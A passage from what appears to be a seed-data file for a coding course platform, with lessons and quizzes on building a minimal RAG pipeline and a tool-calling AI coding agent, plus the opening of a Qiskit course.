          answer: 'floats',
        },
      ],
    },
  },
  {
    title: 'Vector Storage',
    content: lessonContent(
      'Vector Storage',
      `Every chunk now has a vector, but a list of vectors floating around isn't useful on its own, it needs somewhere to live alongside the original text it came from, ready to be searched. This lesson builds a minimal **vector store**.\n\n## Production tools\n\nAt real scale (millions of chunks), you'd reach for a dedicated vector database like **Pinecone**, **FAISS**, or **Weaviate**, tools built specifically to store embeddings and run similarity search fast, even across huge datasets, with persistence to disk and metadata filtering built in.\n\n## A minimal in-memory version\n\nFor this course's scale (a handful of chunks), a plain Python list holding every chunk's text, vector, and metadata together is enough to demonstrate the same core idea:\n\n\`\`\`python\nimport re\nfrom collections import Counter\n\ndef toy_embed(text):\n    words = re.findall(r\"[a-z']+\", text.lower())\n    return Counter(words)\n\nclass VectorStore:\n    def __init__(self):\n        self.entries = []  # each entry: {'text': ..., 'vector': ..., 'metadata': ...}\n\n    def add(self, text, vector, metadata=None):\n        self.entries.append({\n            'text': text,\n            'vector': vector,\n            'metadata': metadata or {},\n        })\n\n    def __len__(self):\n        return len(self.entries)\n\nstore = VectorStore()\nstore.add(\n    'Password reset emails expire after one hour.',\n    toy_embed('Password reset emails expire after one hour.'),\n    metadata={'source': 'faq.md'},\n)\nprint(f'Store now has {len(store)} entr{\"y\" if len(store) == 1 else \"ies\"}.')\n\`\`\`\n\n## Storing every chunk from every document\n\nPutting the last three lessons together, every document gets chunked, every chunk gets embedded, and every (chunk, vector) pair gets added to the store along with which document it came from:\n\n\`\`\`python\ndef chunk_text(text, chunk_size=12, overlap=3):\n    words = text.split()\n    chunks = []\n    start = 0\n    while start < len(words):\n        end = start + chunk_size\n        chunks.append(' '.join(words[start:end]))\n        start += chunk_size - overlap\n    return chunks\n\nraw_documents = [\n    {'source': 'onboarding.md', 'text': 'Kodstigen is a learning platform for programming courses. New students should start with the path that matches their goals.'},\n    {'source': 'faq.md', 'text': 'To reset your password, go to Settings and click Forgot Password. Password reset emails expire after one hour.'},\n    {'source': 'billing.md', 'text': 'Kodstigen is currently free for all students. Instructors can submit courses and challenges for review.'},\n]\n\nstore = VectorStore()\n\nfor doc in raw_documents:\n    for chunk in chunk_text(doc['text']):\n        store.add(chunk, toy_embed(chunk), metadata={'source': doc['source']})\n\nprint(f'Indexed {len(store)} chunks from {len(raw_documents)} documents.')\n\`\`\`\n\nKeeping \`metadata\` (like which file a chunk came from) alongside the vector is what lets a real RAG system cite its sources later, "according to faq.md, ...", rather than just returning an answer with no way to trace where it came from.\n\n> [!TIP]\n> The core idea a vector database adds beyond "a list with vectors in it" is **fast similarity search at scale**, techniques like approximate nearest-neighbor indexing that make searching millions of vectors take milliseconds instead of scanning every single one. This course's simple linear scan (next lesson) is correct but wouldn't stay fast forever, which is exactly why those tools exist.`
    ),
    quiz: {
      title: 'Vector Storage Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does the VectorStore keep metadata (like the source filename) alongside each vector?',
          options: [
            'It is required for cosine similarity to work',
            "So a real system can cite where an answer's supporting chunk came from",
            'To make the vectors smaller',
            'Metadata is not actually needed',
          ],
          answer: "So a real system can cite where an answer's supporting chunk came from",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Pinecone, FAISS, and Weaviate are all examples of dedicated vector database tools.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A key advantage a real vector database adds over a plain list is fast similarity search at ____.',
          options: [],
          answer: 'scale',
        },
      ],
    },
  },
  {
    title: 'Query Input',
    content: lessonContent(
      'Query Input',
      `The knowledge base is indexed, now it's time to handle the other half of RAG: what the user actually asks.\n\n## Turning a question into a vector\n\nA user's question arrives as plain natural language, no different in kind from any of the document chunks already indexed. To be comparable to those chunks at all, it needs to go through the **exact same embedding function**:\n\n\`\`\`python\nimport re\nfrom collections import Counter\n\ndef toy_embed(text):\n    words = re.findall(r\"[a-z']+\", text.lower())\n    return Counter(words)\n\nquery = 'How do I reset my password?'\nquery_vector = toy_embed(query)\nprint(query_vector)\n\`\`\`\n\n## Why the same function matters\n\nIf chunks were embedded with one method and the query with a different one, their vectors wouldn't live in the same "space", comparing them would be meaningless, like comparing a temperature in Celsius to one in Fahrenheit without converting first. Whatever \`embed\`/\`toy_embed\` function built the vectors in your \`VectorStore\`, the query must use that identical function:\n\n\`\`\`python\ndef answer_question(query):\n    query_vector = toy_embed(query)  # same function used when indexing the store\n    print(f'Query: {query!r}')\n    print(f'Query vector: {query_vector}')\n    return query_vector\n\n_ = answer_question('How do I reset my password?')\n\`\`\`\n\nNotice \`toy_embed('How do I reset my password?')\` shares words like \`'password'\` and \`'reset'\` with the FAQ chunk from earlier lessons, that overlap is exactly what the next lesson's similarity search will detect and rank highly.\n\n> [!NOTE]\n> In a production system using real OpenAI embeddings, this step is one extra API call per user question, small and cheap compared to the final LLM call, but it's still a network round-trip, worth remembering when thinking about a RAG pipeline's latency and cost.`
    ),
    quiz: {
      title: 'Query Input Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Why must the user's query be embedded with the exact same function used to embed the stored chunks?",
          options: [
            "It's not actually required, any embedding function works",
            "So the query vector and chunk vectors live in the same comparable space",
            'To make the query run faster',
            'To automatically translate the query',
          ],
          answer: 'So the query vector and chunk vectors live in the same comparable space',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A user query goes through the same embedding process as a document chunk.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A query is expressed in ____ ____ (plain, everyday) language, not a special query syntax.',
          options: [],
          answer: 'natural language',
        },
      ],
    },
  },
  {
    title: 'Retrieval',
    content: lessonContent(
      'Retrieval',
      `With both the knowledge base and the query turned into vectors, this lesson finds which stored chunks are actually relevant to the question, by measuring how similar their vectors are.\n\n## Cosine similarity\n\nThe standard way to compare two vectors for similarity is **cosine similarity**: the cosine of the angle between them, ranging from \`-1\` (opposite) to \`1\` (identical direction), regardless of each vector's magnitude. For sparse \`Counter\`-based vectors, it only needs to look at the words that appear in *both*:\n\n\`\`\`python\nimport re\nimport math\nfrom collections import Counter\n\ndef toy_embed(text):\n    words = re.findall(r\"[a-z']+\", text.lower())\n    return Counter(words)\n\ndef cosine_similarity(vec1, vec2):\n    common_words = set(vec1) & set(vec2)\n    dot_product = sum(vec1[word] * vec2[word] for word in common_words)\n    magnitude1 = math.sqrt(sum(count * count for count in vec1.values()))\n    magnitude2 = math.sqrt(sum(count * count for count in vec2.values()))\n    if magnitude1 == 0 or magnitude2 == 0:\n        return 0.0\n    return dot_product / (magnitude1 * magnitude2)\n\na = toy_embed('Password reset emails expire after one hour.')\nb = toy_embed('How do I reset my password?')\nc = toy_embed('Kodstigen is free for all students.')\n\nprint('a vs b (related):', cosine_similarity(a, b))\nprint('a vs c (unrelated):', cosine_similarity(a, c))\n\`\`\`\n\nRun it, the password-related pair should score noticeably higher than the unrelated pair, exactly what makes retrieval work.\n\n## Retrieving the top-K matches\n\nScoring the query against every stored chunk and keeping only the best few (**top-K**) is the retrieval step itself:\n\n\`\`\`python\nclass VectorStore:\n    def __init__(self):\n        self.entries = []\n\n    def add(self, text, vector, metadata=None):\n        self.entries.append({'text': text, 'vector': vector, 'metadata': metadata or {}})\n\nstore = VectorStore()\nstore.add('Password reset emails expire after one hour.', toy_embed('Password reset emails expire after one hour.'), {'source': 'faq.md'})\nstore.add('Kodstigen is currently free for all students.', toy_embed('Kodstigen is currently free for all students.'), {'source': 'billing.md'})\nstore.add('New students should start with the Python path.', toy_embed('New students should start with the Python path.'), {'source': 'onboarding.md'})\n\ndef retrieve(store, query_vector, top_k=2):\n    scored = [\n        (cosine_similarity(query_vector, entry['vector']), entry)\n        for entry in store.entries\n    ]\n    scored.sort(key=lambda pair: pair[0], reverse=True)\n    return [entry for score, entry in scored[:top_k]]\n\nquery_vector = toy_embed('How do I reset my password?')\nresults = retrieve(store, query_vector, top_k=2)\nfor entry in results:\n    print(entry['metadata']['source'], '->', entry['text'][:60])\n\`\`\`\n\n\`sort(..., reverse=True)\` puts the highest similarity scores first, then \`[:top_k]\` keeps only that many, everything else is discarded, only the most relevant handful of chunks moves on to the next step.\n\n> [!TIP]\n> \`top_k\` is another tunable knob: too small and you might miss a relevant chunk, too large and you dilute the final prompt with irrelevant text (and pay for more tokens). 2-5 is a common starting point for small knowledge bases.`
    ),
    quiz: {
      title: 'Retrieval Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does cosine similarity measure between two vectors?',
          options: [
            'How many words they have in total',
            'How similar their direction is, regardless of magnitude',
            'Which vector was created first',
            'The exact word-for-word difference',
          ],
          answer: 'How similar their direction is, regardless of magnitude',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'retrieve() keeps only the top_k highest-scoring chunks and discards the rest.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Retrieving only the best few matches instead of every chunk is called top-____ retrieval.',
          options: [],
          answer: 'K',
        },
      ],
    },
  },
  {
    title: 'Augmentation',
    content: lessonContent(
      'Augmentation',
      `Retrieval found the relevant chunks, but an LLM doesn't automatically know they exist, they need to actually be inserted into the prompt sent to the model. This step is called **augmentation**, and it's the "A" in RAG.\n\n## Building the augmented prompt\n\n\`\`\`python\ndef build_prompt(query, retrieved_chunks):\n    context = '\\n\\n'.join(chunk['text'] for chunk in retrieved_chunks)\n    return (\n        \"Answer the question using ONLY the context below. \"\n        \"If the answer isn't in the context, say you don't know.\\n\\n\"\n        f\"Context:\\n{context}\\n\\n\"\n        f\"Question: {query}\\n\"\n        \"Answer:\"\n    )\n\n# standing in for the chunks retrieve() would have found in the previous lesson\nretrieved = [\n    {'text': 'To reset your password, go to Settings and click Forgot Password.'},\n    {'text': 'Password reset emails expire after one hour.'},\n]\n\nquery = 'How do I reset my password?'\nprompt = build_prompt(query, retrieved)\nprint(prompt)\n\`\`\`\n\n## Why "ONLY the context"\n\nThat instruction is doing real work, an LLM without it will happily blend its own training knowledge with whatever you gave it, sometimes producing a plausible-sounding but wrong answer for *your specific system* (a classic **hallucination**). Explicitly restricting it to the provided context, and telling it what to say when the answer isn't there, is what makes the final response trustworthy and traceable back to your actual data instead of the model's guesswork.\n\n## The final prompt formula\n\nEvery RAG system boils down to the same combination:\n\n\`\`\`\nFinal prompt = Query + Retrieved Context\n\`\`\`\n\nEverything from Data Collection through Retrieval exists purely to produce a good \`Context\`, augmentation is where that context and the original question finally get combined into the single string the LLM will actually see.\n\n> [!NOTE]\n> \`build_prompt\` is plain string formatting, nothing here calls an LLM yet, that's deliberately the very last step, covered next.`
    ),
    quiz: {
      title: 'Augmentation Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does build_prompt() explicitly instruct the model to answer "using ONLY the context"?',
          options: [
            'To make the response shorter',
            'To prevent the model from blending in ungrounded, possibly wrong knowledge from its own training (hallucination)',
            'It is required by the OpenAI API',
            'To reduce the number of retrieved chunks needed',
          ],
          answer: 'To prevent the model from blending in ungrounded, possibly wrong knowledge from its own training (hallucination)',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The augmentation step itself makes an API call to an LLM.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The final prompt formula is: Final prompt = Query + Retrieved ____.',
          options: [],
          answer: 'Context',
        },
      ],
    },
  },
  {
    title: 'LLM Response',
    content: lessonContent(
      'LLM Response',
      `Every earlier step exists to arrive at this one: handing the fully augmented prompt to an actual LLM and getting back a grounded, context-aware answer.\n\n## Sending the prompt\n\n\`\`\`\nfrom openai import OpenAI\n\nclient = OpenAI()\n\ndef generate_answer(prompt):\n    response = client.chat.completions.create(\n        model='gpt-4o-mini',\n        messages=[{'role': 'user', 'content': prompt}],\n    )\n    return response.choices[0].message.content\n\nanswer = generate_answer(prompt)\nprint(answer)\n\`\`\`\n\n*This needs a real OpenAI API key and network access, so it's read-only here, everything from Data Collection through Augmentation in the earlier lessons runs directly in your browser without any API key at all.*\n\n## Why this produces a better answer\n\nWithout RAG, asking an LLM "How do I reset my password?" gets a generic, plausible-sounding answer about password resets in general, not specific to Kodstigen, since the model has never seen your FAQ. With the augmented prompt from the previous lesson, the model is handed your actual FAQ text as context and instructed to answer only from it, so the response reflects your real password-reset process (the specific email address, the one-hour expiry), not a generic guess.\n\n## The outcome\n\nThis is the entire point of the 8-step pipeline: **more reliable, grounded answers**. The LLM still does the language generation, understanding the question, composing a fluent response, but the *facts* in that response come from your own retrieved data, not from what the model happened to memorize (or half-remember) during training.\n\n> [!TIP]\n> Everything from \`raw_documents\` through \`build_prompt\` is real, runnable Python you've now written from scratch. The only piece that needs an external service is this final call, swapping \`toy_embed\` for real OpenAI embeddings and adding this last API call is genuinely all it takes to turn this into a production RAG system, that's exactly what the final project does next.`
    ),
    quiz: {
      title: 'LLM Response Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Why does the RAG-augmented prompt produce a more useful answer than asking the LLM the question directly?",
          options: [
            'The LLM responds faster with a shorter prompt',
            "The model answers using the specific, real context you retrieved, instead of generic training knowledge",
            'It uses fewer tokens',
            'It skips the need for a system prompt',
          ],
          answer: "The model answers using the specific, real context you retrieved, instead of generic training knowledge",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In this pipeline, the LLM call is the only step that requires a real API key and network access.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The outcome of a working RAG pipeline is more reliable, ____ answers.',
          options: [],
          answer: 'grounded',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build Your Own Mini RAG Pipeline',
    content: lessonContent(
      'Final Project: Build Your Own Mini RAG Pipeline',
      `Every piece from this course now exists on its own: collecting documents, chunking, embedding, storing vectors, embedding a query, retrieving, augmenting, and generating an answer. This final project assembles all of it into one complete, working RAG pipeline.\n\n## Requirements\n\nYour finished \`rag_pipeline.py\` should satisfy every one of these:\n\n1. Collect at least 3 source "documents" as plain strings with a bit of metadata (\`raw_documents\`).\n2. Chunk every document with \`chunk_text()\`, tuning \`chunk_size\`/\`overlap\` for your content.\n3. Embed every chunk (\`toy_embed()\`, or a real embedding model, see stretch goals) and store it in a \`VectorStore\` along with its source metadata.\n4. Accept a natural-language query and embed it with the exact same embedding function used for the chunks.\n5. Retrieve the top-K most similar chunks with \`retrieve()\`/\`cosine_similarity()\`.\n6. Build an augmented prompt with \`build_prompt()\` that includes the retrieved context and instructs the model to answer only from it.\n7. Feed the prompt to an LLM (\`generate_answer()\`, a real OpenAI or OpenRouter call) and print the grounded answer.\n\nBringing every earlier lesson's code together in order (collect → chunk → embed → store → query → retrieve → augment → generate) is the whole pipeline:\n\n\`\`\`\ndef run_pipeline(query, raw_documents, top_k=2):\n    # 1-4: build the knowledge base\n    store = VectorStore()\n    for doc in raw_documents:\n        for chunk in chunk_text(doc['text']):\n            store.add(chunk, toy_embed(chunk), metadata={'source': doc['source']})\n\n    # 5: embed the query\n    query_vector = toy_embed(query)\n\n    # 6: retrieve\n    retrieved = retrieve(store, query_vector, top_k=top_k)\n\n    # 7: augment\n    prompt = build_prompt(query, retrieved)\n\n    # 8: generate (needs a real API key, see the LLM Response lesson)\n    return generate_answer(prompt)\n\nprint(run_pipeline('How do I reset my password?', raw_documents))\n\`\`\`\n\n## Stretch goals\n\n- Swap \`toy_embed()\` for a real embedding model (OpenAI's \`text-embedding-3-small\`, or a local model via the \`sentence-transformers\` package) for genuinely semantic, not just word-overlap, retrieval.\n- Swap the in-memory \`VectorStore\` for a real vector database like **FAISS** (runs locally, no account needed) or **Pinecone**.\n- Add source citations to the final answer, e.g. "According to faq.md: ...", using each retrieved chunk's \`metadata\`.\n- Try a smarter chunking strategy, split on paragraphs or sentences instead of a fixed word count, and compare retrieval quality.\n- Add a simple cache so an identical query doesn't re-embed or re-call the LLM twice.\n\nSubmit a link to your finished project (a repo or gist) below, an instructor will review it before you can mark this lesson complete.`
    ),
    requiresSubmission: true,
  },
];

const aiAgentLessons: SeedLesson[] = [
  {
    title: 'LLMs',
    content: lessonContent(
      'LLMs',
      `An **LLM** (Large Language Model) is a model trained to predict the next token in a sequence of text, given enough training data and scale, that simple objective turns out to produce something that can hold a conversation, write code, and reason through problems. This course builds a real **AI coding agent**, a program that uses an LLM plus tools to actually take action, starting with the basics: sending a prompt and getting a response back.\n\n## The chat message format\n\nEvery modern chat LLM API is built around a list of messages, each with a **role**:\n\n- \`system\`: instructions that set the model's behavior for the whole conversation, not something the user said, more like configuration.\n- \`user\`: what the human (or, later, your code) is asking.\n- \`assistant\`: what the model said back, you'll see this role again when building the agent's conversation history.\n\n\`\`\`python\nmessages = [\n    {'role': 'system', 'content': 'You are a helpful assistant.'},\n    {'role': 'user', 'content': 'What is a large language model?'},\n]\n\`\`\`\n\n## Sending a prompt with the OpenAI SDK, via OpenRouter\n\n**OpenRouter** is a service that exposes dozens of different models (from OpenAI, Anthropic, Meta, and others) behind one single, OpenAI-API-compatible endpoint, so you can use the familiar \`openai\` Python package by just pointing it at a different \`base_url\`:\n\n\`\`\`\nfrom openai import OpenAI\n\nclient = OpenAI(\n    base_url='https://openrouter.ai/api/v1',\n    api_key='YOUR_OPENROUTER_API_KEY',\n)\n\nresponse = client.chat.completions.create(\n    model='openai/gpt-4o-mini',\n    messages=[\n        {'role': 'system', 'content': 'You are a helpful assistant.'},\n        {'role': 'user', 'content': 'What is a large language model?'},\n    ],\n)\n\nprint(response.choices[0].message.content)\n\`\`\`\n\n*This needs a real OpenRouter API key and network access, so it's read-only here, get a free key at openrouter.ai to run this yourself locally.*\n\n\`response.choices[0].message\` is where the model's reply lives, \`.content\` is the actual text. \`choices\` is a list because you can ask a model for multiple candidate responses at once, for a single reply, you'll almost always just use \`choices[0]\`.\n\n> [!TIP]\n> Model names on OpenRouter are prefixed with the provider, \`openai/gpt-4o-mini\`, \`anthropic/claude-3.5-sonnet\`, \`meta-llama/llama-3.1-8b-instruct\`, all callable through the exact same \`client.chat.completions.create(...)\` code, only the \`model\` string changes.`
    ),
    quiz: {
      title: 'LLMs Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the "system" role in a messages list represent?',
          options: [
            "What the human user typed",
            'Instructions that configure the model\'s behavior for the whole conversation',
            "The model's previous reply",
            'An error message',
          ],
          answer: 'Instructions that configure the model\'s behavior for the whole conversation',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'OpenRouter lets you call many different providers\' models through one OpenAI-API-compatible client, just by changing the model string and base_url.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "A model's reply text is found at response.choices[0].message.____",
          options: [],
          answer: 'content',
        },
      ],
    },
  },
  {
    title: 'Functions',
    content: lessonContent(
      'Functions',
      `An LLM on its own can only produce text, it can't read a file, run code, or change anything. To build an actual *agent* (something that takes action, not just talks), you first need real Python functions it can eventually be given access to. This lesson writes three: reading a file, writing a file, and running arbitrary Python code.\n\n## Reading and writing files\n\n\`\`\`python\ndef read_file(path):\n    with open(path, 'r') as f:\n        return f.read()\n\ndef write_file(path, content):\n    with open(path, 'w') as f:\n        f.write(content)\n    return f'Wrote {len(content)} characters to {path}'\n\nwrite_file('notes.txt', 'Remember to fix the bug in calculate_total().')\nprint(read_file('notes.txt'))\n\`\`\`\n\nThese are the two most basic actions any coding agent needs: seeing what's currently in a file, and changing it. Nothing fancy yet, just Python's built-in \`open()\`.\n\n## Running arbitrary Python code\n\nAn agent that can fix bugs needs to actually *execute* code to test whether a fix works, not just read and write text:\n\n\`\`\`python\nimport io\nimport contextlib\n\ndef run_python(code):\n    output = io.StringIO()\n    try:\n        with contextlib.redirect_stdout(output):\n            exec(code, {})\n        return output.getvalue() or '(no output)'\n    except Exception as e:\n        return f'Error: {e}'\n\nprint(run_python('print(2 + 2)'))\nprint(run_python('print(1 / 0)'))\n\`\`\`\n\n- \`exec(code, {})\` runs a string of Python code as if it were a script. Passing \`{}\` as its globals dict gives it a fresh, empty namespace each call, so one \`run_python\` call can't accidentally see variables left over from a previous one.\n- \`contextlib.redirect_stdout(output)\` temporarily redirects anything the code \`print()\`s into an in-memory buffer (\`io.StringIO()\`) instead of your real terminal, so \`run_python\` can capture and return it as a string, exactly what's needed to hand the result back to an LLM as text.\n- The \`try/except\` is deliberate: if the executed code raises an error (like the division by zero above), \`run_python\` returns a description of the error *as its result*, instead of crashing your whole program. An agent needs to see its mistakes as feedback ("that failed because...") to correct course, not have the entire session die.\n\n> [!WARNING]\n> \`exec\` runs code with the same permissions as your own program, there's no sandboxing here. This is fine for a personal learning project you control, but a production agent that executes model-generated code needs much stronger isolation (a container, a subprocess with a timeout, a restricted execution environment), never run untrusted, model-generated code with a bare \`exec\` in anything real.`
    ),
    quiz: {
      title: 'Functions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does run_python wrap exec() in a try/except instead of letting an error crash the program?',
          options: [
            'To make the code run faster',
            "So a failure becomes a text result the agent can see and react to, instead of ending the whole session",
            'try/except is required syntax for exec()',
            'To avoid using io.StringIO',
          ],
          answer: "So a failure becomes a text result the agent can see and react to, instead of ending the whole session",
        },
        {
          type: 'TRUE_FALSE',
          prompt: "contextlib.redirect_stdout lets run_python capture printed output into a string instead of the real terminal.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "exec(code, {}) runs code with a fresh, empty ____ dictionary so previous calls can't leak variables into it.",
          options: [],
          answer: 'globals',
        },
      ],
    },
  },
  {
    title: 'Function Calling',
    content: lessonContent(
      'Function Calling',
      `Having Python functions the agent *could* use isn't the same as the LLM actually being able to use them, a model only outputs text, it has no way to directly call a Python function in your program. **Function calling** (also called **tool calling**) is the bridge: you describe your functions to the model in a structured format, and the model can respond by asking you to call one, with specific arguments, instead of (or as well as) replying in plain text.\n\n## Describing a function to the model\n\nEach tool is described with a JSON Schema, its name, what it does, and what arguments it takes:\n\n\`\`\`python\ntools = [\n    {\n        'type': 'function',\n        'function': {\n            'name': 'run_python',\n            'description': 'Execute a snippet of Python code and return its printed output.',\n            'parameters': {\n                'type': 'object',\n                'properties': {\n                    'code': {'type': 'string', 'description': 'The Python code to run.'},\n                },\n                'required': ['code'],\n            },\n        },\n    },\n]\n\`\`\`\n\n\`description\` matters more than it looks, the model decides *whether* and *when* to call a tool based on how clearly it understands what that tool does from this text alone.\n\n## Passing tools to the model\n\n\`\`\`\nresponse = client.chat.completions.create(\n    model='openai/gpt-4o-mini',\n    messages=messages,\n    tools=tools,\n)\n\nmessage = response.choices[0].message\nif message.tool_calls:\n    for call in message.tool_calls:\n        print(call.function.name, call.function.arguments)\n\`\`\`\n\n*This needs a real API key, so it's read-only here.* Crucially: the model does **not** run \`run_python\` itself, it can't, it has no way to execute code. It just replies with a structured request, "please call \`run_python\` with \`code='print(2 + 2)'\`", \`.arguments\` arrives as a JSON *string* your own code still has to parse and act on.\n\n## Dispatching a tool call yourself\n\nThis part needs no API key at all, it's the exact mechanics your own code has to implement, testable right now with a fake tool call standing in for a real model response:\n\n\`\`\`python\nimport io\nimport json\nimport contextlib\n\ndef run_python(code):\n    output = io.StringIO()\n    try:\n        with contextlib.redirect_stdout(output):\n            exec(code, {})\n        return output.getvalue() or '(no output)'\n    except Exception as e:\n        return f'Error: {e}'\n\navailable_functions = {\n    'run_python': run_python,\n}\n\ndef dispatch_tool_call(tool_call):\n    function_name = tool_call['name']\n    arguments = json.loads(tool_call['arguments'])\n    function = available_functions[function_name]\n    return function(**arguments)\n\nfake_tool_call = {\n    'name': 'run_python',\n    'arguments': json.dumps({'code': 'print(3 * 7)'}),\n}\n\nresult = dispatch_tool_call(fake_tool_call)\nprint(result)\n\`\`\`\n\n\`json.loads(tool_call['arguments'])\` turns the model's JSON-string arguments back into a real Python dict, \`function(**arguments)\` then calls the right function by unpacking that dict as keyword arguments, so \`{'code': '...'}\` becomes \`run_python(code='...')\`.\n\n> [!NOTE]\n> \`available_functions\` is a lookup table mapping the *name* the model was told about (in \`tools\`) to the *actual function object* your code can call, keeping these in sync (every tool you describe to the model needs a matching entry here) is what makes dispatch work at all.`
    ),
    quiz: {
      title: 'Function Calling Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'When a model responds with a tool call, what actually executes the underlying function?',
          options: [
            'The model executes it internally',
            "Your own code, by dispatching the requested function name and arguments",
            'OpenRouter runs it on their servers automatically',
            'Nothing, tool calls are purely informational',
          ],
          answer: "Your own code, by dispatching the requested function name and arguments",
        },
        {
          type: 'TRUE_FALSE',
          prompt: "A tool call's arguments arrive as a JSON string that your code must parse with something like json.loads().",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "function(**arguments) unpacks a dict of arguments as ____ arguments to call the function.",
          options: [],
          answer: 'keyword',
        },
      ],
    },
  },
  {
    title: 'Agents',
    content: lessonContent(
      'Agents',
      `Everything so far, sending prompts, writing tool functions, dispatching a tool call, are the individual pieces. An **agent** is what you get when you wire them into a loop: call the model, execute whatever it asks for, feed the result back, and repeat, until the model decides the task is done. This final project builds that loop and points it at a real bug.\n\n## The agent loop\n\n\`\`\`\ndef run_agent(user_task, max_steps=10):\n    messages = [\n        {\n            'role': 'system',\n            'content': 'You are a coding agent. Use the available tools to inspect and fix the bug, then explain the fix.',\n        },\n        {'role': 'user', 'content': user_task},\n    ]\n\n    for _ in range(max_steps):\n        response = client.chat.completions.create(\n            model='openai/gpt-4o-mini',\n            messages=messages,\n            tools=tools,\n        )\n        message = response.choices[0].message\n        messages.append(message)\n\n        if not message.tool_calls:\n            return message.content  # no more tools requested, this is the agent's final answer\n\n        for call in message.tool_calls:\n            result = dispatch_tool_call({\n                'name': call.function.name,\n                'arguments': call.function.arguments,\n            })\n            messages.append({\n                'role': 'tool',\n                'tool_call_id': call.id,\n                'content': str(result),\n            })\n\n    return \"Agent didn't finish within max_steps.\"\n\`\`\`\n\n*This needs a real API key and calls the model in a loop, so it's read-only here, this is exactly what you'll run locally for the final project.*\n\n## Why this is "the feedback loop"\n\n- \`messages\` accumulates the **entire** conversation, the original task, every one of the model's replies (including tool call requests), and every tool result, appended with role \`'tool'\`. Each new call to the model sees all of it, so it remembers what it already tried and what happened.\n- The loop only stops when \`message.tool_calls\` is empty, meaning the model chose to reply with a plain final answer instead of requesting another tool. Until then, it keeps working: read a file, notice a bug, run code to test a fix, write the corrected file, run it again to confirm.\n- \`max_steps\` is a safety net. Without it, a model stuck in a bad loop (repeatedly trying the same failing fix) would run forever, capping the attempts guarantees the agent eventually stops one way or another.\n\nThis is the difference between a chatbot and an **agent**: a chatbot replies once, an agent keeps working, using tools and its own prior results, until it decides the job is actually finished.\n\n## Final project requirements\n\n1. Set up a real OpenRouter (or OpenAI) API key and the \`openai\` Python package locally, this project needs to make real API calls.\n2. Implement \`read_file\`, \`write_file\`, and \`run_python\` (from the Functions lesson, or your own versions).\n3. Write a JSON tool schema for each function (Function Calling lesson) and pass all of them via \`tools\`.\n4. Implement the full \`run_agent()\` loop above: call the model, execute any requested tool calls, feed each result back as a \`'tool'\`-role message, and repeat until the model gives a final plain-text answer.\n5. Point your agent at a real, small, deliberately-broken Python file (plant a genuine bug, an off-by-one error, a wrong variable name, a missing edge case) and give it a task like *"There's a bug in bug.py, find and fix it."* Let it read the file, diagnose the problem, and use \`run_python\`/\`write_file\` to actually fix it, then confirm the fix works.\n\n## Stretch goals\n\n- Log every tool call (name and arguments) to the console as the agent works, visibility into *why* it's doing what it's doing is invaluable for debugging your own agent.\n- Add a \`list_files\` tool so the agent can explore an entire project directory, not just one file you already told it about.\n- Handle the case where the model requests multiple tool calls in a single turn (the \`for call in message.tool_calls:\` loop above already supports this, verify it with a task that needs two tools at once).\n- Add a friendlier message (or a retry with a smaller task) when \`max_steps\` is hit, instead of just giving up.\n\nSubmit a link to your finished project (a repo or gist) below, an instructor will review it before you can mark this lesson complete.`
    ),
    requiresSubmission: true,
  },
];

const qiskitLessons: SeedLesson[] = [
  {
    title: 'Setup and Your First Circuit',
    content: lessonContent(
      'Setup and Your First Circuit',
      `**Qiskit** is IBM's open-source Python SDK for quantum computing: build a quantum circuit in Python, run it on a simulator (or real quantum hardware), and read back the results. A classical bit is always definitely 0 or 1, a **qubit** can be in a mix of both at once (**superposition**), and two qubits can become correlated in a way with no classical equivalent (**entanglement**). This course builds up both ideas from scratch, in code.\n\n## Installing Qiskit\n\nQiskit relies on compiled numerical libraries that aren't available in this course's browser sandbox, so write and run this project locally with a real Python install.\n\n\`\`\`bash\npip install qiskit qiskit-aer\n\`\`\`\n\n\`qiskit\` is the core library for building circuits, \`qiskit-aer\` adds the high-performance local simulator you'll use throughout this course, before ever touching real quantum hardware.\n\n## Building a circuit\n\n\`\`\`\nfrom qiskit import QuantumCircuit\n\nqc = QuantumCircuit(1, 1)  # 1 qubit, 1 classical bit\nqc.x(0)                    # flip the qubit from |0> to |1>\nqc.measure(0, 0)           # read the qubit into the classical bit\n\nprint(qc.draw())\n\`\`\`\n\n- \`QuantumCircuit(1, 1)\` allocates one **qubit** (starts in state \`|0>\`, physicists' notation for "definitely 0") and one **classical bit** to eventually hold a measurement result, quantum and classical bits are tracked separately.\n- \`qc.x(0)\` applies the **X gate** to qubit 0, the quantum equivalent of a classical NOT: it flips \`|0>\` to \`|1>\` (and vice versa).\n- \`qc.measure(0, 0)\` measures qubit 0 and stores the outcome in classical bit 0. Measuring is a 